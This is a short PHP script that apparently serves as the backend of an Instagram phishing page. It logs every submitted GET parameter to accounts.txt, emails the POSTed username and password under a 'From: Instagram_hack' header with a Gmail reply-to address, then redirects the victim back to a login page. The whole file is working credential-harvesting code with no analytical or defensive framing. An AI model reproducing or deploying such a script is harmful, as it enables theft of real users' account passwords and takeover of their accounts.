<?php
header ('Location:login.html');
$handle = fopen("accounts.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$to      = '';
$subject = 'Instagram Account';
$username = $_POST['username'];
$password = $_POST['password'];
$message = "Username:" . $username . "\r\n" . "Password: " . $password;
$headers = 'From: Instagram_hack' . "\r\n" .
    'Reply-To: Aqilelhaee@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
exit;
?>